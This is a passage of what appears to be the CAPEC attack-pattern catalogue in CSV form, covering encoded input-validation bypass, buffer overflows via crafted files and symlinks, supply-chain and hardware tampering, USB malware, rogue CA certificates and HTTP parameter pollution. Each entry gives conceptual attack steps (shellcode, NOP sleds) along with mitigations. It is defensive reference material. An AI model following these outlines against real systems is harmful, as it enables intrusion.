then, encode that using URL encoding to %26%2392%3B%26%2346%3B::STEP:4:PHASE:Exploit:DESCRIPTION:[Leverage ability to bypass input validation] Attacker leverages their ability to bypass input validation to gain unauthorized access to system. There are many attacks possible, and a few examples are mentioned here.:TECHNIQUE:Gain access to sensitive files.:TECHNIQUE:Perform command injection.:TECHNIQUE:Perform SQL injection.:TECHNIQUE:Perform XSS attacks.::\",\"::User input is used to construct a command to be executed on the target system or as part of the file name.::Multiple parser passes are performed on the data supplied by the user.::\",\"::SKILL:Knowledge of various escaping schemes, such as URL escape encoding and XML escape characters.:LEVEL:Medium::\",\"\",\"::Control characters are being detected by the filters repeatedly.::\",\"::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::\",\"::An iterative approach to input validation may be required to ensure that no dangerous characters are present. It may be necessary to implement redundant checking across different input validation layers. Ensure that invalid data is rejected as soon as possible and do not continue to work with it.::Make sure to perform input validation on canonicalized data (i.e. data that is data in its most standard form). This will help avoid tricky encodings getting past the filters.::Assume all input is malicious. Create an allowlist that defines all valid input to the software system based on the requirements specifications. Input that does not match against the allowlist would not be permitted to enter into the system.::\",\"::The backslash character provides a good example of the multiple-parser issue. A backslash is used to escape characters in strings, but is also used to delimit directories on the NT file system. When performing a command injection that includes NT paths, there is usually a need to double escape the backslash. In some cases, a quadruple escape is necessary. Original String: C:winntsystem32cmd.exe /c <parsing layer> Interim String: C:winntsystem32cmd.exe /c <parsing layer> Final String: C:winntsystem32cmd.exe /c This diagram shows each successive layer of parsing translating the backslash character. A double backslash becomes a single as it is parsed. By using quadruple backslashes, the attacker is able to control the result in the final string. [REF-1]::\",\"::179::181::184::183::77::78::74::20::697::707::\",\"\",\"\",\n433,\"Target Influence via The Human Buffer Overflow\",Detailed,Draft,\"An attacker utilizes a technique to insinuate commands to the subconscious mind of the target via communication patterns. The human buffer overflow methodology does not rely on over-stimulating the mind of the target, but rather embedding messages within communication that the mind of the listener assembles at a subconscious level. The human buffer-overflow method is similar to subconscious programming to the extent that messages are embedded within the message.\",\"\",,Low,\"::NATURE:ChildOf:CAPEC ID:427::\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\n434,\"Target Influence via Interview and Interrogation\",Detailed,Draft,\"\",\"\",,Low,\"::NATURE:ChildOf:CAPEC ID:427::\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\n435,\"Target Influence via Instant Rapport\",Detailed,Draft,\"\",\"\",,Low,\"::NATURE:ChildOf:CAPEC ID:427::\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\n438,\"Modification During Manufacture\",Meta,Draft,\"An attacker modifies a technology, product, or component during a stage in its manufacture for the purpose of carrying out an attack against some entity involved in the supply chain lifecycle. There are an almost limitless number of ways an attacker can modify a technology when they are involved in its manufacture, as the attacker has potential inroads to the software composition, hardware design and assembly, firmware, or basic design mechanics. Additionally, manufacturing of key components is often outsourced with the final product assembled by the primary manufacturer. The greatest risk, however, is deliberate manipulation of design specifications to produce malicious hardware or devices. There are billions of transistors in a single integrated circuit and studies have shown that fewer than 10 transistors are required to create malicious functionality.\",\"\",,,\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1195:ENTRY NAME:Supply Chain Compromise::\",\"\",\n439,\"Manipulation During Distribution\",Meta,Draft,\"An attacker undermines the integrity of a product, software, or technology at some stage of the distribution channel. The core threat of modification or manipulation during distribution arise from the many stages of distribution, as a product may traverse multiple suppliers and integrators as the final asset is delivered. Components and services provided from a manufacturer to a supplier may be tampered with during integration or packaging.\",\"\",,,\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"::A malicious OEM provider, or OEM provider employee or contractor, may install software, or modify existing code, during distribution.::External contractors involved in the packaging or testing of products or components may install software, or modify existing code, during distribution.::\",\"::1269::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1195:ENTRY NAME:Supply Chain Compromise::\",\"\",\n44,\"Overflow Binary Resource File\",Detailed,Draft,\"An attack of this type exploits a buffer overflow vulnerability in the handling of binary resources. Binary resources may include music files like MP3, image files like JPEG files, and any other binary file. These attacks may pass unnoticed to the client machine through normal usage of files, such as a browser loading a seemingly innocent JPEG file. This can allow the adversary access to the execution stack and execute arbitrary code in the target process.\",\"\",High,Very High,\"::NATURE:ChildOf:CAPEC ID:100::NATURE:ChildOf:CAPEC ID:23::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Identify target software] The adversary identifies software that uses external binary files in some way. This could be a file upload, downloading a file from a shared location, or other means.::STEP:2:PHASE:Experiment:DESCRIPTION:[Find injection vector] The adversary creates a malicious binary file by altering the header to make the file seem shorter than it is. Additional bytes are added to the end of the file to be placed in the overflowed location. The adversary then deploys the file to the software to determine if a buffer overflow was successful.::STEP:3:PHASE:Experiment:DESCRIPTION:[Craft overflow content] Once the adversary has determined that this attack is viable, they will specially craft the binary file in a way that achieves the desired behavior. If the source code is available, the adversary can carefully craft the malicious file so that the return address is overwritten to an intended value. If the source code is not available, the adversary will iteratively alter the file in order to overwrite the return address correctly.:TECHNIQUE:Create malicious shellcode that will execute when the program execution is returned to it.:TECHNIQUE:Use a NOP-sled in the overflow content to more easily slide into the malicious code. This is done so that the exact return address need not be correct, only in the range of all of the NOPs::STEP:4:PHASE:Exploit:DESCRIPTION:[Overflow the buffer] Once the adversary has constructed a file that will effectively overflow the targeted software in the intended way. The file is deployed to the software, either by serving it directly to the software or placing it in a shared location for a victim to load into the software.::\",\"::Target software processes binary resource files.::Target software contains a buffer overflow vulnerability reachable through input from a user-controllable binary resource file.::\",\"::SKILL:To modify file, deceive client into downloading, locate and exploit remote stack or heap vulnerability:LEVEL:Medium::\",\"\",\"\",\"::SCOPE:Availability:TECHNICAL IMPACT:Unreliable Execution::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::\",\"::Perform appropriate bounds checking on all buffers.::Design: Enforce principle of least privilege::Design: Static code analysis::Implementation: Execute program in less trusted process space environment, do not allow lower integrity processes to write to higher integrity processes::Implementation: Keep software patched to ensure that known vulnerabilities are not available for adversaries to target on host.::\",\"::Binary files like music and video files are appended with additional data to cause buffer overflow on target systems. Because these files may be filled with otherwise popular content, the adversary has an excellent vector for wide distribution. There have been numerous cases, for example of malicious screen savers for sports teams that are distributed on the event of the team winning a championship.::\",\"::120::119::697::\",\"\",\"\",\n440,\"Hardware Integrity Attack\",Meta,Stable,\"An adversary exploits a weakness in the system maintenance process and causes a change to be made to a technology, product, component, or sub-component or a new one installed during its deployed use at the victim location for the purpose of carrying out an attack.\",\"\",Low,High,\"\",\"\",\"::Influence over the deployed system at a victim location.::\",\"\",\"\",\"\",\"::SCOPE:Integrity:TECHNICAL IMPACT:Execute Unauthorized Commands::\",\"\",\"\",\"\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1195.003:ENTRY NAME:Supply Chain Compromise: Compromise Hardware Supply Chain::::TAXONOMY NAME:ATTACK:ENTRY ID:1200:ENTRY NAME:Hardware Additions::\",\"\",\n441,\"Malicious Logic Insertion\",Meta,Stable,\"An adversary installs or adds malicious logic (also known as malware) into a seemingly benign component of a fielded system. This logic is often hidden from the user of the system and works behind the scenes to achieve negative impacts. With the proliferation of mass digital storage and inexpensive multimedia devices, Bluetooth and 802.11 support, new attack vectors for spreading malware are emerging for things we once thought of as innocuous greeting cards, picture frames, or digital projectors. This pattern of attack focuses on systems already fielded and used in operation as opposed to systems and their components that are still under development and part of the supply chain.\",\"\",Medium,High,\"\",\"\",\"::Access to the component currently deployed at a victim location.::\",\"\",\"\",\"\",\"::SCOPE:Authorization:TECHNICAL IMPACT:Execute Unauthorized Commands::\",\"\",\"\",\"::284::\",\"\",\"\",\n442,\"Infected Software\",Standard,Stable,\"An adversary adds malicious logic, often in the form of a computer virus, to otherwise benign software. This logic is often hidden from the user of the software and works behind the scenes to achieve negative impacts. Many times, the malicious logic is inserted into empty space between legitimate code, and is then called when the software is executed. This pattern of attack focuses on software already fielded and used in operation as opposed to software that is still under development and part of the supply chain.\",\"\",Medium,High,\"::NATURE:ChildOf:CAPEC ID:441::\",\"\",\"::Access to the software currently deployed at a victim location. This access is often obtained by leveraging another attack pattern to gain permissions that the adversary wouldn't normally have.::\",\"\",\"\",\"\",\"::SCOPE:Authorization:TECHNICAL IMPACT:Execute Unauthorized Commands::\",\"::Leverage anti-virus products to detect and quarantine software with known virus.::\",\"\",\"::506::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1195.001:ENTRY NAME:Supply Chain Compromise: Compromise Software Dependencies and Development Tools::::TAXONOMY NAME:ATTACK:ENTRY ID:1195.002:ENTRY NAME:Supply Chain Compromise: Compromise Software Supply Chain::\",\"\",\n443,\"Malicious Logic Inserted Into Product by Authorized Developer\",Detailed,Stable,\"An adversary uses their privileged position within an authorized development organization to inject malicious logic into a codebase or product.\",\"\",Medium,High,\"::NATURE:ChildOf:CAPEC ID:444::\",\"\",\"::Access to the product during the initial or continuous development.::\",\"\",\"\",\"\",\"::SCOPE:Authorization:TECHNICAL IMPACT:Execute Unauthorized Commands::\",\"::Assess software and hardware during development and prior to deployment to ensure that it functions as intended and without any malicious functionality. This includes both initial development, as well as updates propagated to the product after deployment.::\",\"::In January 2022 the author of popular JavaScript packages Faker and colors, used for generating mock data and including colored text within NodeJS consoles respectively, introduced malicious code that resulted in a Denial of Service (DoS) via an infinite loop. When applications that leveraged these packages updated to the malicious version, their applications executed the infinite loop and output gibberish ASCI characters endlessly. This resulted in the application being unusable until a stable version of the package was obtained. [REF-705]::During initial development, an authorized hardware developer implants a malicious microcontroller within an Internet of Things (IOT) device and programs the microcontroller to communicate with the vulnerable device. Each time the device initializes, the malicious microcontroller's code is executed, which ultimately provides the adversary with backdoor access to the vulnerable device. This can further allow the adversary to sniff network traffic, exfiltrate date, execute unauthorized commands, and/or pivot to other vulnerable devices.::\",\"\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1195.002:ENTRY NAME:Supply Chain Compromise: Compromise Software Supply Chain::::TAXONOMY NAME:ATTACK:ENTRY ID:1195.003:ENTRY NAME:Supply Chain Compromise: Compromise Hardware Supply Chain::\",\"\",\n444,\"Development Alteration\",Standard,Stable,\"An adversary modifies a technology, product, or component during its development to acheive a negative impact once the system is deployed. The goal of the adversary is to modify the system in such a way that the negative impact can be leveraged when the system is later deployed. Development alteration attacks may include attacks that insert malicious logic into the system's software, modify or replace hardware components, and other attacks which negatively impact the system during development. These attacks generally require insider access to modify source code or to tamper with hardware components. The product is then delivered to the user where the negative impact can be leveraged at a later time.\",\"\",Medium,High,\"::NATURE:ChildOf:CAPEC ID:438::\",\"\",\"::Access to the system during the development phase to alter and/or modify software and hardware components. This access is often obtained via insider access or by leveraging another attack pattern to gain permissions that the adversary wouldn't normally have.::\",\"\",\"\",\"\",\"::SCOPE:Authorization:TECHNICAL IMPACT:Execute Unauthorized Commands::SCOPE:Availability:TECHNICAL IMPACT:Unreliable Execution::SCOPE:Integrity:TECHNICAL IMPACT:Alter Execution Logic::\",\"::Assess software and software components during development and prior to deployment to ensure that they function as intended and without any malicious functionality.::\",\"\",\"\",\"\",\"\",\n445,\"Malicious Logic Insertion into Product Software via Configuration Management Manipulation\",Detailed,Stable,\"An adversary exploits a configuration management system so that malicious logic is inserted into a software products build, update or deployed environment. If an adversary can control the elements included in a product's configuration management for build they can potentially replace, modify or insert code files containing malicious logic. If an adversary can control elements of a product's ongoing operational configuration management baseline they can potentially force clients receiving updates from the system to install insecure software when receiving updates from the server.\",\"\",Medium,High,\"::NATURE:ChildOf:CAPEC ID:444::\",\"\",\"::Access to the configuration management system during deployment or currently deployed at a victim location. This access is often obtained via insider access or by leveraging another attack pattern to gain permissions that the adversary wouldn't normally have.::\",\"\",\"\",\"\",\"::SCOPE:Authorization:TECHNICAL IMPACT:Execute Unauthorized Commands::\",\"::Assess software during development and prior to deployment to ensure that it functions as intended and without any malicious functionality.::Leverage anti-virus products to detect and quarantine software with known virus.::\",\"::In 2016, the policy-based configuration management system Chef was shown to be vulnerable to remote code execution attacks based on its Chef Manage add-on improperly deserializing user-driven cookie data. This allowed unauthenticated users the ability to craft cookie data that executed arbitrary code with the web server's privileges. [REF-706]::\",\"\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1195.001:ENTRY NAME:Supply Chain Compromise: Compromise Software Dependencies and Development Tools::\",\"\",\n446,\"Malicious Logic Insertion into Product via Inclusion of Third-Party Component\",Detailed,Stable,\"An adversary conducts supply chain attacks by the inclusion of insecure third-party components into a technology, product, or code-base, possibly packaging a malicious driver or component along with the product before shipping it to the consumer or acquirer.\",\"\",Medium,High,\"::NATURE:ChildOf:CAPEC ID:444::\",\"\",\"::Access to the product during the initial or continuous development. This access is often obtained via insider access to include the third-party component after deployment.::\",\"\",\"\",\"\",\"::SCOPE:Authorization:TECHNICAL IMPACT:Execute Unauthorized Commands::\",\"::Assess software and hardware during development and prior to deployment to ensure that it functions as intended and without any malicious functionality. This includes both initial development, as well as updates propagated to the product after deployment.::Don't assume popular third-party components are free from malware or vulnerabilities. For software, assess for malicious functionality via update/commit reviews or automated static/dynamic analysis prior to including the component within the application and deploying in a production environment.::\",\"::From mid-2014 to early 2015, Lenovo computers were shipped with the Superfish Visual Search software that ultimately functioned as adware on the system. The Visual Search installation included a self-signed root HTTPS certificate that was able to intercept encrypted traffic for any site visited by the user. Of more concern was the fact that the certificate's corresponding private key was the same for every Lenovo machine. Once the private key was discovered [REF-709], an adversary could then conduct an Adversary-in-the-Middle (AitM) attack that would go undetected by machines that had this certificate installed on it. Adversaries could then masquerade as legitimate entities such as financial institutions, popular corporations, or other secure destinations on the Internet. [REF-708]::In 2018 it was discovered that Chinese spies infiltrated several U.S. government agencies and corporations as far back as 2015 by including a malicious microchip within the motherboard of servers sold by Elemental Technologies to the victims. Although these servers were assembled via a U.S. based company, the motherboards used within the servers were manufactured and maliciously altered via a Chinese subcontractor. Elemental Technologies then sold these malicious servers to various U.S. government agencies, such as the DoD and CIA, and corporations like Amazon and Apple. The malicious microchip provided adversaries with a backdoor into the system, which further allowed them to access any network that contained the exploited systems, to exfiltrate data to be sent to the Chinese government.[REF-713]::\",\"\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1195:ENTRY NAME:Supply Chain Compromise::\",\"\",\n447,\"Design Alteration\",Standard,Stable,\"An adversary modifies the design of a technology, product, or component to acheive a negative impact once the system is deployed. In this type of attack, the goal of the adversary is to modify the design of the system, prior to development starting, in such a way that the negative impact can be leveraged when the system is later deployed. Design alteration attacks differ from development alteration attacks in that design alteration attacks take place prior to development and which then may or may not be developed by the adverary. Design alteration attacks include modifying system designs to degrade system performance, cause unexpected states or errors, and general design changes that may lead to additional vulnerabilities. These attacks generally require insider access to modify design documents, but they may also be spoofed via web communications. The product is then developed and delivered to the user where the negative impact can be leveraged at a later time.\",\"\",Medium,High,\"::NATURE:ChildOf:CAPEC ID:438::\",\"\",\"::Access to system design documentation prior to the development phase. This access is often obtained via insider access or by leveraging another attack pattern to gain permissions that the adversary wouldn't normally have.::Ability to forge web communications to deliver modified design documentation.::\",\"\",\"\",\"\",\"::SCOPE:Authorization:TECHNICAL IMPACT:Execute Unauthorized Commands::SCOPE:Availability:TECHNICAL IMPACT:Unreliable Execution::SCOPE:Integrity:TECHNICAL IMPACT:Alter Execution Logic::\",\"::Assess design documentation prior to development to ensure that they function as intended and without any malicious functionality.::Ensure that design documentation is saved in a secure location and has proper access controls set in place to avoid unnecessary modification.::\",\"\",\"\",\"\",\"\",\n448,\"Embed Virus into DLL\",Detailed,Stable,\"An adversary tampers with a DLL and embeds a computer virus into gaps between legitimate machine instructions. These gaps may be the result of compiler optimizations that pad memory blocks for performance gains. The embedded virus then attempts to infect any machine which interfaces with the product, and possibly steal private data or eavesdrop.\",\"\",Medium,High,\"::NATURE:ChildOf:CAPEC ID:442::\",\"\",\"::Access to the software currently deployed at a victim location. This access is often obtained by leveraging another attack pattern to gain permissions that the adversary wouldn't normally have.::\",\"\",\"\",\"\",\"::SCOPE:Authorization:TECHNICAL IMPACT:Execute Unauthorized Commands::\",\"::Leverage anti-virus products to detect and quarantine software with known virus.::\",\"\",\"::506::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1027.009:ENTRY NAME:Obfuscated Files or Information: Embedded Payloads::\",\"\",\n45,\"Buffer Overflow via Symbolic Links\",Detailed,Draft,\"This type of attack leverages the use of symbolic links to cause buffer overflows. An adversary can try to create or manipulate a symbolic link file such that its contents result in out of bounds data. When the target software processes the symbolic link file, it could potentially overflow internal buffers with insufficient bounds checking.\",\"\",High,High,\"::NATURE:ChildOf:CAPEC ID:100::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Identify target application] The adversary identifies a target application or program that might load in certain files to memory.::STEP:2:PHASE:Experiment:DESCRIPTION:[Find injection vector] The adversary identifies an injection vector to deliver the excessive content to the targeted application's buffer.:TECHNIQUE:The adversary creates or modifies a symbolic link pointing to those files which contain an excessive amount of data. If creating a symbolic link to one of those files causes different behavior in the application, then an injection vector has been identified.::STEP:3:PHASE:Experiment:DESCRIPTION:[Craft overflow file content] The adversary crafts the content to be injected. If the intent is to simply cause the software to crash, the content need only consist of an excessive quantity of random data. If the intent is to leverage the overflow for execution of arbitrary code, the adversary crafts the payload in such a way that the overwritten return address is replaced with one of the adversary's choosing.:TECHNIQUE:Create malicious shellcode that will execute when the program execution is returned to it.:TECHNIQUE:Use a NOP-sled in the overflow content to more easily slide into the malicious code. This is done so that the exact return address need not be correct, only in the range of all of the NOPs::STEP:4:PHASE:Exploit:DESCRIPTION:[Overflow the buffer] Using the specially crafted file content, the adversary creates a symbolic link from the identified resource to the malicious file, causing a targeted buffer overflow attack.::\",\"::The adversary can create symbolic link on the target host.::The target host does not perform correct boundary checking while consuming data from a resources.::\",\"::SKILL:An adversary can simply overflow a buffer by inserting a long string into an adversary-modifiable injection vector. The result can be a DoS.:LEVEL:Low::SKILL:Exploiting a buffer overflow to inject malicious code into the stack of a software system or even the heap can require a higher skill level.:LEVEL:High::\",\"\",\"::An adversary creating or modifying Symbolic links is a potential signal of attack in progress.::An adversary deleting temporary files can also be a sign that the adversary is trying to replace legitimate resources with malicious ones.::\",\"::SCOPE:Availability:TECHNICAL IMPACT:Unreliable Execution::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::\",\"::Pay attention to the fact that the resource you read from can be a replaced by a Symbolic link. You can do a Symlink check before reading the file and decide that this is not a legitimate way of accessing the resource.::Because Symlink can be modified by an adversary, make sure that the ones you read are located in protected directories.::Pay attention to the resource pointed to by your symlink links (See attack pattern named Forced Symlink race), they can be replaced by malicious resources.::Always check the size of the input data before copying to a buffer.::Use a language or compiler that performs automatic bounds checking.::Use an abstraction library to abstract away risky APIs. Not a complete solution.::Compiler-based canary mechanisms such as StackGuard, ProPolice and the Microsoft Visual Studio /GS flag. Unless this provides automatic bounds checking, it is not a complete solution.::Use OS-level preventative functionality. Not a complete solution.::\",\"::The EFTP server has a buffer overflow that can be exploited if an adversary uploads a .lnk (link) file that contains more than 1,744 bytes. This is a classic example of an indirect buffer overflow. First the adversary uploads some content (the link file) and then the adversary causes the client consuming the data to be exploited. In this example, the ls command is exploited to compromise the server software.::\",\"::120::285::302::118::119::74::20::680::697::\",\"\",\"\",\n452,\"Infected Hardware\",Standard,Stable,\"An adversary inserts malicious logic into hardware, typically in the form of a computer virus or rootkit. This logic is often hidden from the user of the hardware and works behind the scenes to achieve negative impacts. This pattern of attack focuses on hardware already fielded and used in operation as opposed to hardware that is still under development and part of the supply chain.\",\"\",Medium,High,\"::NATURE:ChildOf:CAPEC ID:441::\",\"\",\"::Access to the hardware currently deployed at a victim location.::\",\"\",\"\",\"\",\"::SCOPE:Authorization:TECHNICAL IMPACT:Execute Unauthorized Commands::\",\"\",\"\",\"\",\"\",\"\",\n456,\"Infected Memory\",Standard,Stable,\"An adversary inserts malicious logic into memory enabling them to achieve a negative impact. This logic is often hidden from the user of the system and works behind the scenes to achieve negative impacts. This pattern of attack focuses on systems already fielded and used in operation as opposed to systems that are still under development and part of the supply chain.\",\"\",Medium,High,\"::NATURE:ChildOf:CAPEC ID:441::\",\"\",\"\",\"\",\"\",\"\",\"::SCOPE:Authorization:TECHNICAL IMPACT:Execute Unauthorized Commands::\",\"::Leverage anti-virus products to detect stop operations with known virus.::\",\"::A USB Memory stick has malicious logic inserted before shipping of the product allowing for infection of the host machine once inserted into the USB port.::In 2007, approximately 1800 of Seagate's Maxtor Personal Storage 3200 drives were built under contract with an outside manufacturer and contained a virus that stole user passwords.::\",\"::1257::1260::1274::1312::1316::\",\"\",\"\",\n457,\"USB Memory Attacks\",Detailed,Draft,\"An adversary loads malicious code onto a USB memory stick in order to infect any system which the device is plugged in to. USB drives present a significant security risk for business and government agencies. Given the ability to integrate wireless functionality into a USB stick, it is possible to design malware that not only steals confidential data, but sniffs the network, or monitor keystrokes, and then exfiltrates the stolen data off-site via a Wireless connection. Also, viruses can be transmitted via the USB interface without the specific use of a memory stick. The attacks from USB devices are often of such sophistication that experts conclude they are not the work of single individuals, but suggest state sponsorship. These attacks can be performed by an adversary with direct access to a target system or can be executed via means such as USB Drop Attacks.\",\"\",Low,High,\"::NATURE:ChildOf:CAPEC ID:456::NATURE:CanPrecede:CAPEC ID:529::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Determine Target System] In certain cases, the adversary will explore an organization's network to determine a specific target machine to exploit based on the information it contains or privileges the main user may possess.:TECHNIQUE:If needed, the adversary explores an organization's network to determine if any specific systems of interest exist.::STEP:2:PHASE:Experiment:DESCRIPTION:[Develop or Obtain malware and install on a USB device] The adversary develops or obtains the malicious software necessary to exploit the target system, which they then install on an external USB device such as a USB flash drive.:TECHNIQUE:The adversary can develop or obtain malware for to perform a variety of tasks such as sniffing network traffic or monitoring keystrokes.::STEP:3:PHASE:Exploit:DESCRIPTION:[Connect or deceive a user into connecting the infected USB device] Once the malware has been placed on an external USB device, the adversary connects the device to the target system or deceives a user into connecting the device to the target system such as in a USB Drop Attack.:TECHNIQUE:The adversary connects the USB device to a specified target system or performs a USB Drop Attack, hoping a user will find and connect the USB device on their own. Once the device is connected, the malware executes giving the adversary access to network traffic, credentials, etc.::\",\"::Some level of physical access to the device being attacked.::Information pertaining to the target organization on how to best execute a USB Drop Attack.::\",\"\",\"\",\"\",\"\",\"::Ensure that proper, physical system access is regulated to prevent an adversary from physically connecting a malicious USB device themself.::Use anti-virus and anti-malware tools which can prevent malware from executing if it finds its way onto a target system. Additionally, make sure these tools are regularly updated to contain up-to-date virus and malware signatures.::Do not connect untrusted USB devices to systems connected on an organizational network. Additionally, use an isolated testing machine to validate untrusted devices and confirm malware does not exist.::\",\"\",\"::1299::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1091:ENTRY NAME:Replication Through Removable Media::::TAXONOMY NAME:ATTACK:ENTRY ID:1092:ENTRY NAME:Communication Through Removable Media::\",\"\",\n458,\"Flash Memory Attacks\",Detailed,Draft,\"An adversary inserts malicious logic into a product or technology via flashing the on-board memory with a code-base that contains malicious logic. Various attacks exist against the integrity of flash memory, the most direct being rootkits coded into the BIOS or chipset of a device.\",\"\",,,\"::NATURE:ChildOf:CAPEC ID:456::\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"::1282::\",\"\",\"\",\n459,\"Creating a Rogue Certification Authority Certificate\",Detailed,Draft,\"An adversary exploits a weakness resulting from using a hashing algorithm with weak collision resistance to generate certificate signing requests (CSR) that contain collision blocks in their to be signed parts. The adversary submits one CSR to be signed by a trusted certificate authority then uses the signed blob to make a second certificate appear signed by said certificate authority. Due to the hash collision, both certificates, though different, hash to the same value and so the signed blob works just as well in the second certificate. The net effect is that the adversary's second X.509 certificate, which the Certification Authority has never seen, is now signed and validated by that Certification Authority.\",\"\",Medium,Very High,\"::NATURE:ChildOf:CAPEC ID:473::\",\"::STEP:1:PHASE:Experiment:DESCRIPTION:[Craft Certificates] The adversary crafts two different, but valid X.509 certificates that when hashed with an insufficiently collision resistant hashing algorithm would yield the same value.::STEP:2:PHASE:Experiment:DESCRIPTION:[Send CSR to Certificate Authority] The adversary sends the CSR for one of the certificates to the Certification Authority which uses the targeted hashing algorithm. That request is completely valid and the Certificate Authority issues an X.509 certificate to the adversary which is signed with its private key.::STEP:3:PHASE:Exploit:DESCRIPTION:[Insert Signed Blob into Unsigned Certificate] The adversary takes the signed blob and inserts it into the second X.509 certificate that the attacker generated. Due to the hash collision, both certificates, though different, hash to the same value and so the signed blob is valid in the second certificate. The result is two certificates that appear to be signed by a valid certificate authority despite only one having been signed.::\",\"::Certification Authority is using a hash function with insufficient collision resistance to generate the certificate hash to be signed::\",\"::SKILL:Understanding of how to force a hash collision in X.509 certificates:LEVEL:High::SKILL:An attacker must be able to craft two X.509 certificates that produce the same hash value:LEVEL:High::SKILL:Knowledge needed to set up a certification authority:LEVEL:Medium::\",\"::Knowledge of a certificate authority that uses hashing algorithms with poor collision resistance::A valid certificate request and a malicious certificate request with identical hash values::\",\"\",\"::SCOPE:Access Control:SCOPE:Authentication:TECHNICAL IMPACT:Gain Privileges::\",\"::Certification Authorities need to stop using deprecated or cryptographically insecure hashing algorithms to hash the certificates that they are about to sign. Instead they should be using stronger hashing functions such as SHA-256 or SHA-512.::\",\"::MD5 Collisions The MD5 algorithm is not collision resistant, allowing attackers to use spoofing attacks to create rogue certificate Authorities.See also: CVE-2004-2761::SHA1 Collisions The SHA1 algorithm is not collision resistant, allowing attackers to use spoofing attacks to create rogue certificate Authorities.See also: CVE-2005-4900::PKI Infrastructure vulnerabilities Research has show significant vulnerabilities in PKI infrastructure. Trusted certificate authorities have been shown to use weak hashing algorithms after attacks have been demonstrated against those algorithms. Additionally, reliable methods have been demonstrated for generated MD5 collisions that could be used to generate malicious CSRs.::\",\"::327::295::290::\",\"\",\"\",\n46,\"Overflow Variables and Tags\",Detailed,Draft,\"This type of attack leverages the use of tags or variables from a formatted configuration data to cause buffer overflow. The adversary crafts a malicious HTML page or configuration file that includes oversized strings, thus causing an overflow.\",\"\",High,High,\"::NATURE:ChildOf:CAPEC ID:100::NATURE:PeerOf:CAPEC ID:8::NATURE:PeerOf:CAPEC ID:10::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Identify target application] The adversary identifies a target application or program to perform the buffer overflow on. Adversaries look for applications or programs that accept formatted files, such as configuration files, as input.::STEP:2:PHASE:Experiment:DESCRIPTION:[Find injection vector] The adversary identifies an injection vector to deliver the excessive content to the targeted application's buffer.:TECHNIQUE:Knowing the type of file that an application takes as input, the adversary takes a normal input file and modifies a single variable or tag to contain a large amount of data. If there is a crash, this means that a buffer overflow attack is possible. The adversary will keep changing single variables or tags one by one until they see a change in behavior.::STEP:3:PHASE:Experiment:DESCRIPTION:[Craft overflow content] The adversary crafts the content to be injected. If the intent is to simply cause the software to crash, the content need only consist of an excessive quantity of random data. If the intent is to leverage the overflow for execution of arbitrary code, the adversary crafts the payload in such a way that the overwritten return address is replaced with one of the adversary's choosing.:TECHNIQUE:Create malicious shellcode that will execute when the program execution is returned to it.:TECHNIQUE:Use a NOP-sled in the overflow content to more easily slide into the malicious code. This is done so that the exact return address need not be correct, only in the range of all of the NOPs::STEP:4:PHASE:Exploit:DESCRIPTION:[Overflow the buffer] The adversary will upload the crafted file to the application, causing a buffer overflow.::\",\"::The target program consumes user-controllable data in the form of tags or variables.::The target program does not perform sufficient boundary checking.::\",\"::SKILL:An adversary can simply overflow a buffer by inserting a long string into an adversary-modifiable injection vector. The result can be a DoS.:LEVEL:Low::SKILL:Exploiting a buffer overflow to inject malicious code into the stack of a software system or even the heap can require a higher skill level.:LEVEL:High::\",\"\",\"\",\"::SCOPE:Availability:TECHNICAL IMPACT:Unreliable Execution::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::\",\"::Use a language or compiler that performs automatic bounds checking.::Use an abstraction library to abstract away risky APIs. Not a complete solution.::Compiler-based canary mechanisms such as StackGuard, ProPolice and the Microsoft Visual Studio /GS flag. Unless this provides automatic bounds checking, it is not a complete solution.::Use OS-level preventative functionality. Not a complete solution.::Do not trust input data from user. Validate all user input.::\",\"::A buffer overflow vulnerability exists in the Yamaha MidiPlug that can be accessed via a Text variable found in an EMBED tag.See also: CVE-1999-0946::A buffer overflow in Exim allows local users to gain root privileges by providing a long :include: option in a .forward file.See also: CVE-1999-0971::\",\"::120::118::119::74::20::680::733::697::\",\"\",\"\",\n460,\"HTTP Parameter Pollution (HPP)\",Detailed,Draft,\"An adversary adds duplicate HTTP GET/POST parameters by injecting query string delimiters. Via HPP it may be possible to override existing hardcoded HTTP parameters, modify the application behaviors, access and, potentially exploit, uncontrollable variables, and bypass input validation checkpoints and WAF rules.\",\"\",,Medium,\"::NATURE:ChildOf:CAPEC ID:15::NATURE:CanPrecede:CAPEC ID:676::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Find User Input] The adversary finds anywhere in the web application that uses user-supplied input 